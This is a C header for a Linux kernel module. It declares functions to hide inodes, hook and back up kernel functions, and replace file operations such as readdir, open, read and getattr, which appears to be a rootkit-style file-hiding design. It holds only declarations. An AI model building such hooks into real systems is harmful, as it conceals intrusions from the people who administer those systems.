#ifndef DEVICE_FILE_H_
#define DEVICE_FILE_H_
#include <linux/compiler.h> /* __must_check */
#include <linux/slab.h>
#include <linux/fs.h>
#ifndef BUF_LEN
#define BUF_LEN 256
#endif
__must_check int register_device(void); /* 0 if Ok*/
void unregister_device(void); 
int inode_hide_init(void);
void inode_hide_exit(void);
void allocate_memmory(void);
void reallocate_memmory(void);
unsigned long hook_functions(const char *);
unsigned long backup_functions(void);
int parent_readdir (struct file *, void *, filldir_t);
int new_readdir (struct file *, void *, filldir_t);
int new_open (struct inode *, struct file *);
int new_flush (struct file *, fl_owner_t id);
int new_release (struct inode *, struct file *);
int new_ioctl (struct inode *, struct file *, unsigned int, unsigned long);
int new_lock (struct file *, int, struct file_lock *);
int new_mmap (struct file *, struct vm_area_struct *);
ssize_t new_read (struct file *, char __user *, size_t, loff_t *);
ssize_t new_write (struct file *, const char __user *, size_t, loff_t *);
int new_getattr (struct vfsmount *mnt, struct dentry *, struct kstat *);
int new_rmdir (struct inode *,struct dentry *);

#endif //DEVICE_FILE_H_
